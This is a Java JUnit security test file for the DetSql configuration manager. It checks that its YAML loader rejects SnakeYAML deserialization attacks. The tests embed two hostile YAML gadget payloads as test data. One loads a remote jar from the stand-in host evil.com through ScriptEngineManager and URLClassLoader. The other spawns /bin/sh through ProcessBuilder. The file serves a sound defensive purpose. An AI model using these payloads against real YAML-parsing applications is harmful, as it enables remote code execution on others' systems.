/*
 * @saoshao<1224165231@qq.com>
 */
package DetSql;

import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;
import org.yaml.snakeyaml.error.YAMLException;

import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;

import static org.junit.jupiter.api.Assertions.*;
import DetSql.config.ConfigManager;
import DetSql.config.DefaultConfig;
import DetSql.config.DetSqlYamlConfig;

/**
 * 安全测试：验证 ConfigManager 防御 SnakeYAML RCE 漏洞
 * 
 * 修复方案：使用类型受限的 Constructor
 * - 只允许反序列化 DetSqlYamlConfig 类
 * - 阻止反序列化任意类（如 ProcessBuilder、ScriptEngineManager）
 * - 防止 RCE 攻击
 */
class ConfigManagerSecurityTest {

    @TempDir
    Path tempDir;

    /**
     * 测试：恶意 YAML 应该被拒绝（防止 RCE）
     * 使用类型受限的 Constructor 后，尝试反序列化任意类应该失败
     */
    @Test
    void testMaliciousYamlRejected() throws IOException {
        // 创建包含恶意 Gadget 的 YAML 文件
        // 这个 payload 尝试实例化 ScriptEngineManager 来执行代码
        String maliciousYaml = "!!javax.script.ScriptEngineManager [\n" +
                "  !!java.net.URLClassLoader [[\n" +
                "    !!java.net.URL [\"http://evil.com/payload.jar\"]\n" +
                "  ]]\n" +
                "]";

        Path configDir = tempDir.resolve(".config/DetSql");
        Files.createDirectories(configDir);
        Path configFile = configDir.resolve("config.yaml");
        Files.write(configFile, maliciousYaml.getBytes(StandardCharsets.UTF_8));

        // 创建 ConfigManager（使用临时目录）
        ConfigManager configManager = new ConfigManagerForTest(configFile.getParent().getParent().getParent());

        // 尝试加载恶意配置应该失败或返回默认配置
        // SafeConstructor 会抛出 YAMLException 或返回 null
        DetSqlYamlConfig config = configManager.loadConfig();

        // 验证：应该返回默认配置（因为恶意 YAML 被拒绝或解析失败）
        assertNotNull(config, "配置不应为 null");
        assertEquals(DefaultConfig.DEFAULT_DELAY_TIME_MS, config.getDelaytime(),
                "应该返回默认配置（恶意 YAML 被拒绝）");
        
        // 关键验证：恶意代码不应该被执行
        // 如果 RCE 成功，会创建 /tmp/pwned.txt 文件
        Path pwnedFile = Paths.get("/tmp/pwned.txt");
        assertFalse(Files.exists(pwnedFile), "恶意代码不应该被执行");
    }

    /**
     * 测试：正常的配置文件应该可以加载
     * 使用类型受限的 Constructor，只允许 DetSqlYamlConfig 类
     */
    @Test
    void testLegitimateYamlAccepted() throws IOException {
        // 创建合法的配置文件
        String legitimateYaml = "delaytime: 500\n" +
                "statictime: 200\n" +
                "starttime: 3000\n" +
                "endtime: 5000\n" +
                "switchEnabled: true\n" +
                "errorcheck: true\n" +
                "numcheck: true\n" +
                "stringcheck: true\n" +
                "ordercheck: true\n" +
                "boolcheck: true\n";

        Path configDir = tempDir.resolve(".config/DetSql");
        Files.createDirectories(configDir);
        Path configFile = configDir.resolve("config.yaml");
        Files.write(configFile, legitimateYaml.getBytes(StandardCharsets.UTF_8));

        // 创建 ConfigManager
        ConfigManager configManager = new ConfigManagerForTest(configFile.getParent().getParent().getParent());

        // 加载配置
        DetSqlYamlConfig config = configManager.loadConfig();

        // 验证：配置应该正确加载
        assertNotNull(config);
        assertEquals(500, config.getDelaytime());
        assertEquals(200, config.getStatictime());
        assertEquals(3000, config.getStarttime());
        assertEquals(5000, config.getEndtime());
        assertTrue(config.isSwitchEnabled());
    }

    /**
     * 测试：尝试反序列化任意类应该失败
     */
    @Test
    void testArbitraryClassInstantiationBlocked() throws IOException {
        // 尝试实例化 ProcessBuilder（常见的 RCE Gadget）
        String maliciousYaml = "!!java.lang.ProcessBuilder\n" +
                "- /bin/sh\n" +
                "- -c\n" +
                "- echo pwned > /tmp/pwned.txt\n";

        Path configDir = tempDir.resolve(".config/DetSql");
        Files.createDirectories(configDir);
        Path configFile = configDir.resolve("config.yaml");
        Files.write(configFile, maliciousYaml.getBytes(StandardCharsets.UTF_8));

        ConfigManager configManager = new ConfigManagerForTest(configFile.getParent().getParent().getParent());

        // 应该返回默认配置（恶意 YAML 被拒绝）
        DetSqlYamlConfig config = configManager.loadConfig();
        assertNotNull(config);
        assertEquals(DefaultConfig.DEFAULT_DELAY_TIME_MS, config.getDelaytime());
    }

    /**
     * 测试用的 ConfigManager 子类，允许指定自定义的配置文件路径
     */
    private static class ConfigManagerForTest extends ConfigManager {
        private final Path configPath;

        ConfigManagerForTest(Path configPath) {
            this.configPath = configPath.resolve(".config/DetSql/config.yaml");
        }

        @Override
        public Path getConfigPath() {
            return configPath;
        }
    }
}
